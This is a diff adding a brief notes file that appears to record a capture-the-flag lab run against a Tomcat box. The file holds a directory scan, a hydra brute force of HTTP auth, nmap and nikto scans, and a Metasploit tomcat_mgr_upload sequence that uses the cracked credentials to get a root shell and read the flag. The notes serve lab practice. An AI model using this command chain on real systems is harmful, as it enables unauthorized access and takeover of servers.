@@ -1,0 +1,22 @@
+toolsrus.txt
+
+gobuster dir -u http://10.10.161.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+hydra -l bob -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.161.106 http-get /protected
+nmap -sV -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.161.106
+nikto -host http://10.10.161.106:1234/manager/html -id bob:bubbles
+grep documentation nikto.txt | wc -l
+
+
+Metasploit:
+msfconsole
+search tomcat
+use multi/http/tomcat_mgr_upload
+set RHOSTS 10.10.161.106
+set RPORT 1234
+set HttpPassword bubbles
+set HttpUsername bob
+run
+shell
+whoami
+cat /root/flag.txt
+
